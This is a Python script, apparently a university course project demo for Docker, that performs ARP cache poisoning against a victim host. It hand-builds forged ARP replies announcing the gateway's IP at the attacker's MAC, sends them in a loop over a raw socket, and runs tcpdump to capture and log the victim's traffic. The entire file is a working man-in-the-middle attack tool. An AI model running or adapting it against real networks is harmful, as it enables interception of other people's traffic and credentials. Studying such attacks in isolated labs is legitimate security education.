#!/usr/bin/env python3
"""
Simple ARP Cache Poisoning Attack for Docker Demo
CSE406 Project - Quick Demo Version (Fixed)
"""

import socket
import struct
import time
import threading
import subprocess
import sys
import os
from datetime import datetime

class SimpleARPAttack:
    def __init__(self):
        self.victim_ip = "192.168.1.50"
        self.victim_mac = None
        self.gateway_ip = "192.168.1.1"
        self.gateway_mac = None
        self.attacker_mac = None
        self.poisoning = False
        
    def get_mac_address(self, ip):
        """Get MAC address for IP"""
        try:
            # Use ARP command
            result = subprocess.run(['arp', '-n', ip], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for part in parts:
                            if ':' in part and len(part) >= 17:
                                return part.lower()
        except:
            pass
        return "aa:bb:cc:dd:ee:02"  # Default for demo
    
    def get_interface_info(self):
        """Get local interface information"""
        interface = "eth0"  # Default for containers
        
        try:
            # Try multiple methods to get MAC address
            methods = [
                f'/sys/class/net/{interface}/address',
                f'/sys/class/net/eth0/address'
            ]
            
            for method in methods:
                try:
                    with open(method, 'r') as f:
                        mac = f.read().strip()
                        if mac and len(mac) >= 17:
                            self.attacker_mac = mac.lower()
                            print(f"[+] Attacker MAC: {self.attacker_mac}")
                            return interface
                except:
                    continue
            
            # Fallback method using ip command
            try:
                result = subprocess.run(['ip', 'link', 'show', interface], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'link/ether' in line:
                            parts = line.split()
                            for i, part in enumerate(parts):
                                if part == 'link/ether' and i + 1 < len(parts):
                                    self.attacker_mac = parts[i + 1].lower()
                                    print(f"[+] Attacker MAC: {self.attacker_mac}")
                                    return interface
            except:
                pass
            
            # Final fallback - use a default MAC for demo
            if not self.attacker_mac:
                print("[!] Could not determine MAC address, using default")
                self.attacker_mac = "02:42:c0:a8:01:64"  # Default Docker MAC pattern
                print(f"[+] Using default MAC: {self.attacker_mac}")
                
        except Exception as e:
            print(f"[-] Error getting interface info: {e}")
            self.attacker_mac = "02:42:c0:a8:01:64"
            print(f"[+] Using fallback MAC: {self.attacker_mac}")
            
        return interface
    
    def create_arp_packet(self, target_mac, target_ip, sender_ip, sender_mac):
        """Create ARP poison packet"""
        try:
            # Ensure MAC addresses are valid
            if not sender_mac or not target_mac:
                raise ValueError("Invalid MAC addresses")
                
            # Ethernet header
            eth_dst = bytes.fromhex(target_mac.replace(':', ''))
            eth_src = bytes.fromhex(sender_mac.replace(':', ''))
            eth_type = struct.pack('!H', 0x0806)  # ARP
            eth_header = eth_dst + eth_src + eth_type
            
            # ARP packet
            hw_type = struct.pack('!H', 1)      # Ethernet
            proto_type = struct.pack('!H', 0x0800)  # IPv4
            hw_len = struct.pack('!B', 6)       # MAC length
            proto_len = struct.pack('!B', 4)    # IP length
            operation = struct.pack('!H', 2)    # ARP Reply
            
            sender_mac_bytes = bytes.fromhex(sender_mac.replace(':', ''))
            sender_ip_bytes = socket.inet_aton(sender_ip)
            target_mac_bytes = bytes.fromhex(target_mac.replace(':', ''))
            target_ip_bytes = socket.inet_aton(target_ip)
            
            arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
                         sender_mac_bytes + sender_ip_bytes + 
                         target_mac_bytes + target_ip_bytes)
            
            return eth_header + arp_packet
            
        except Exception as e:
            print(f"[-] Error creating ARP packet: {e}")
            return None
    
    def poison_arp_cache(self):
        """Main ARP poisoning function"""
        interface = self.get_interface_info()
        
        # Verify we have attacker MAC
        if not self.attacker_mac:
            print("[-] Could not determine attacker MAC address")
            return
        
        # Get victim MAC
        self.victim_mac = self.get_mac_address(self.victim_ip)
        print(f"[+] Victim MAC: {self.victim_mac}")
        
        print(f"[+] Starting ARP poisoning attack...")
        print(f"[+] Target: {self.victim_ip} ({self.victim_mac})")
        print(f"[+] Spoofing gateway: {self.gateway_ip}")
        
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            sock.bind((interface, 0))
            
            poison_count = 0
            
            while self.poisoning:
                # Create poison packet (tell victim that gateway is at our MAC)
                poison_packet = self.create_arp_packet(
                    self.victim_mac,     # Send to victim
                    self.victim_ip,      # Victim IP
                    self.gateway_ip,     # Claim to be gateway
                    self.attacker_mac    # Our MAC
                )
                
                if poison_packet:
                    # Send poison packet
                    sock.send(poison_packet)
                    poison_count += 1
                    
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    print(f"[{timestamp}] Poison packet #{poison_count} sent")
                else:
                    print("[-] Failed to create poison packet")
                    break
                
                time.sleep(2)  # Send every 2 seconds
                
        except Exception as e:
            print(f"[-] Poisoning error: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
    
    def monitor_traffic(self):
        """Monitor network traffic"""
        print(f"[+] Starting traffic monitoring...")
        
        # Initialize log file
        try:
            with open('/opt/tools/traffic_log.txt', 'w') as f:
                timestamp = datetime.now().strftime('%H:%M:%S')
                f.write(f"[{timestamp}] Traffic monitoring started\n")
        except:
            pass
        
        try:
            # Check if tcpdump is available
            result = subprocess.run(['which', 'tcpdump'], 
                                  capture_output=True, text=True)
            if result.returncode != 0:
                print("[!] tcpdump not found, installing...")
                subprocess.run(['apt', 'update'], capture_output=True)
                subprocess.run(['apt', 'install', '-y', 'tcpdump'], 
                             capture_output=True)
            
            # Use tcpdump to monitor traffic
            cmd = ['tcpdump', '-i', 'eth0', '-n', '-l', f'host {self.victim_ip}']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT, text=True,
                                     bufsize=1, universal_newlines=True)
            
            while self.poisoning:
                try:
                    line = process.stdout.readline()
                    if line:
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        clean_line = line.strip()
                        if clean_line and not clean_line.startswith('tcpdump:'):
                            print(f"[{timestamp}] TRAFFIC: {clean_line}")
                            
                            # Log to file
                            try:
                                with open('/opt/tools/traffic_log.txt', 'a') as f:
                                    f.write(f"[{timestamp}] {clean_line}\n")
                            except:
                                pass
                    else:
                        time.sleep(0.1)
                except:
                    break
                    
            # Cleanup
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                try:
                    process.kill()
                except:
                    pass
                    
        except Exception as e:
            print(f"[-] Traffic monitoring error: {e}")
    
    def start_attack(self, duration=300):  # 5 minutes default
        """Start the complete attack"""
        print("="*60)
        print("Simple ARP Cache Poisoning Attack")
        print("CSE406 Project - Docker Demo")
        print("="*60)
        
        # Verify we're running as root
        if os.geteuid() != 0:
            print("[-] This script requires root privileges")
            return
        
        self.poisoning = True
        
        # Start traffic monitoring first
        monitor_thread = threading.Thread(target=self.monitor_traffic)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Small delay to let monitoring start
        time.sleep(1)
        
        # Start ARP poisoning in background
        poison_thread = threading.Thread(target=self.poison_arp_cache)
        poison_thread.daemon = True
        poison_thread.start()
        
        try:
            print(f"[+] Attack running for {duration} seconds...")
            print("[+] Press Ctrl+C to stop early")
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[+] Attack stopped by user")
        
        self.poisoning = False
        print("[+] Cleaning up...")
        time.sleep(2)  # Give threads time to cleanup
        print("[+] Attack completed")

def main():
    # Check if running as root
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        print("[+] Run with: sudo python3 simple_arp_attack.py")
        sys.exit(1)
    
    attack = SimpleARPAttack()
    attack.start_attack()

if __name__ == "__main__":
    main()
